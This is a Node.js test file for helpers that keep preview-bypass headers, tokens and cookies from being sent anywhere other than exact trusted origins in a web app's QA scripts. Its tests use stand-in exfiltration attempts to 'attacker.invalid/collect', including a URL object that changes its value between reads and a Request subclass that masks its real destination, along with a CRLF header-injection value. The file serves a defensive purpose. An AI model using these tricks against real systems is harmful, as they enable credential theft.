import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import test from "node:test";

import { canonicalPreviewCdpHeaders, canonicalPreviewRequestHeaders } from "./lib/canonical-preview-request.mjs";
import { exactQaBrowserTarget, exactQaSupabaseOrigin, qaCredentialBoundFetch, qaPublicKey } from "./lib/qa-public-preview.mjs";

const origin = "https://dev.thebackyard.com.mx";
const secret = "synthetic-bypass-test-only";

test("Preview protection bypass is attached only to the exact canonical origin", () => {
  assert.equal(canonicalPreviewRequestHeaders(`${origin}/api/health`, origin, secret)["x-vercel-protection-bypass"], secret);
  assert.equal(canonicalPreviewRequestHeaders("https://bymeopxkxapfizeeqeyb.supabase.co/auth/v1/settings", origin, secret)["x-vercel-protection-bypass"], undefined);
  assert.equal(canonicalPreviewRequestHeaders("https://example.invalid/", origin, secret)["x-vercel-protection-bypass"], undefined);
  assert.equal(canonicalPreviewRequestHeaders("https://example.invalid/", origin, secret, { "x-vercel-protection-bypass": secret })["x-vercel-protection-bypass"], undefined);
  assert.equal(canonicalPreviewRequestHeaders("https://bymeopxkxapfizeeqeyb.supabase.co/", origin, "", { "X-Vercel-Protection-Bypass": secret })["x-vercel-protection-bypass"], undefined);
  assert.throws(() => canonicalPreviewRequestHeaders(`${origin}/`, "https://example.invalid", secret), /origin mismatch/);
});

test("CDP redirect headers cannot carry app or Supabase credentials off-origin", () => {
  const inherited = {
    accept: "text/html", authorization: "Bearer user-secret", cookie: "session=private",
    apikey: "supabase-public", "x-api-key": "provider-secret", "proxy-authorization": "Basic private",
    "x-provider-secret": "provider-private", "x-custom-session": "session-private", "x-client-info": "supabase-js-test",
    "x-vercel-protection-bypass": secret,
  };
  const thirdParty = canonicalPreviewRequestHeaders("https://redirect-target.invalid/path", origin, secret, inherited);
  assert.deepEqual(thirdParty, { accept: "text/html" });
  const cdpThirdParty = Object.fromEntries(canonicalPreviewCdpHeaders("https://redirect-target.invalid/path", origin, secret, inherited).map(({ name, value }) => [name, value]));
  assert.deepEqual(cdpThirdParty, { accept: "text/html" });

  const supabase = canonicalPreviewRequestHeaders("https://bymeopxkxapfizeeqeyb.supabase.co/auth/v1/token", origin, secret, inherited);
  assert.equal(supabase.authorization, "Bearer user-secret");
  assert.equal(supabase.apikey, "supabase-public");
  assert.equal(supabase["x-client-info"], "supabase-js-test");
  for (const forbidden of ["cookie", "x-api-key", "proxy-authorization", "x-vercel-protection-bypass", "x-provider-secret", "x-custom-session"]) assert.equal(supabase[forbidden], undefined);

  const app = canonicalPreviewRequestHeaders(`${origin}/api/cloud/rounds`, origin, secret, inherited);
  assert.equal(app.authorization, "Bearer user-secret");
  assert.equal(app.cookie, "session=private");
  assert.equal(app.apikey, undefined);
  assert.equal(app["x-vercel-protection-bypass"], secret);
});

test("Preview protection helper preserves ordinary headers and rejects header injection", () => {
  const headers = canonicalPreviewRequestHeaders(`${origin}/`, origin, "", { cookie: "qa=1" });
  assert.equal(headers.cookie, "qa=1");
  assert.equal(headers["x-vercel-protection-bypass"], undefined);
  assert.throws(() => canonicalPreviewRequestHeaders(`${origin}/`, origin, "bad\r\nheader"), /invalid header value/);
  const cdp = canonicalPreviewCdpHeaders(`${origin}/`, origin, secret, { accept: "text/html" });
  assert.ok(cdp.some((entry) => entry.name === "x-vercel-protection-bypass" && entry.value === secret));
});

test("owner QA credentials accept only the exact isolated Supabase HTTPS origin", async () => {
  const qa = "https://bymeopxkxapfizeeqeyb.supabase.co";
  assert.equal(exactQaSupabaseOrigin(qa), qa);
  for (const value of [
    "http://bymeopxkxapfizeeqeyb.supabase.co",
    "https://bymeopxkxapfizeeqeyb.supabase.co:444",
    "https://user:secret@bymeopxkxapfizeeqeyb.supabase.co",
    "https://bymeopxkxapfizeeqeyb.supabase.co/rest/v1",
    "https://bymeopxkxapfizeeqeyb.supabase.co?redirect=1",
  ]) {
    let failure;
    try { exactQaSupabaseOrigin(value); } catch (error) { failure = error; }
    assert.ok(failure instanceof Error);
    assert.doesNotMatch(String(failure?.message || failure), /user:secret|redirect=1|:444/i);
  }
  let calls = 0;
  const bound = qaCredentialBoundFetch(qa, async () => { calls++; return new Response(null, { status: 200 }); });
  await bound(`${qa}/auth/v1/token`, { method: "POST" });
  await assert.rejects(() => bound("https://example.invalid/auth", { method: "POST" }), /destination mismatch/);
  await assert.rejects(() => bound(`blob:${qa}/synthetic`, { method: "POST" }), /destination mismatch/);
  let renders = 0; let delivered = "";
  const alternating = { toString: () => (++renders === 1 ? `${qa}/auth/v1/token` : "https://attacker.invalid/collect") };
  const immutable = qaCredentialBoundFetch(qa, async (input) => { delivered = String(input); return new Response(null, { status: 200 }); });
  await immutable(alternating, { headers: { authorization: "Bearer synthetic-token" } });
  assert.equal(delivered, `${qa}/auth/v1/token`);
  assert.equal(renders, 1);
  class MaskedRequest extends Request { get url() { return `${qa}/auth/v1/token`; } }
  await assert.rejects(() => immutable(new MaskedRequest("https://attacker.invalid/collect", { headers: { authorization: "Bearer synthetic-token" } })), /destination mismatch/);
  assert.equal(delivered, `${qa}/auth/v1/token`);
  assert.equal(calls, 1);
});

test("QA browser entrypoints reject credential-bearing URLs without echoing secrets", () => {
  assert.equal(exactQaBrowserTarget(origin).origin, origin);
  assert.equal(exactQaBrowserTarget("http://127.0.0.1:3000", { allowLocal: true }).origin, "http://127.0.0.1:3000");
  const unsafeValues = [
    "https://LEAK_USER_SENTINEL:LEAK_PASSWORD_SENTINEL@dev.thebackyard.com.mx/",
    "https://dev.thebackyard.com.mx:7444/",
    "https://dev.thebackyard.com.mx/LEAK_PATH_SENTINEL",
    "https://dev.thebackyard.com.mx/?token=LEAK_QUERY_SENTINEL",
    "https://dev.thebackyard.com.mx:443/",
    "https://dev.thebackyard.com.mx/a/../",
    "https://DEV.thebackyard.com.mx/",
    " https://dev.thebackyard.com.mx/",
  ];
  for (const script of ["scripts/qa-preview-public.mjs", "scripts/qa-owner-review-browser.mjs"]) {
    for (const unsafe of unsafeValues) {
      const result = spawnSync(process.execPath, [script, unsafe], { encoding: "utf8", timeout: 15_000 });
      assert.equal(result.signal, null);
      assert.equal(result.error, undefined);
      assert.notEqual(result.status, null);
      assert.notEqual(result.status, 0);
      assert.doesNotMatch(`${result.stdout}\n${result.stderr}`, /LEAK_USER_SENTINEL|LEAK_PASSWORD_SENTINEL|LEAK_QUERY_SENTINEL|LEAK_PATH_SENTINEL|:7444/i);
    }
  }
});

test("credential headers are stripped from URL forms that only normalize to a trusted origin", () => {
  const sensitive = { authorization: "Bearer private", cookie: "session=private", apikey: "public", "x-vercel-protection-bypass": secret };
  for (const target of [
    `blob:${origin}/synthetic`,
    `https://user:password@dev.thebackyard.com.mx/`,
    `https://dev.thebackyard.com.mx:443/`,
  ]) {
    const headers = canonicalPreviewRequestHeaders(target, origin, secret, sensitive);
    for (const name of ["authorization", "cookie", "apikey", "x-vercel-protection-bypass"]) assert.equal(headers[name], undefined);
  }
});

test("public QA key validation rejects privileged and malformed keys without echoing them", () => {
  assert.equal(qaPublicKey(`sb_publishable_${"a".repeat(24)}`), `sb_publishable_${"a".repeat(24)}`);
  for (const value of [
    `sb_secret_LEAK_SECRET_SENTINEL_${"a".repeat(24)}`,
    "e30.LEAK_PAYLOAD_SENTINEL.signature",
    "not-a-key-LEAK_VALUE_SENTINEL",
  ]) {
    let failure;
    try { qaPublicKey(value); } catch (error) { failure = error; }
    assert.ok(failure instanceof Error);
    assert.doesNotMatch(failure.message, /LEAK_SECRET_SENTINEL|LEAK_PAYLOAD_SENTINEL|LEAK_VALUE_SENTINEL/);
  }
});
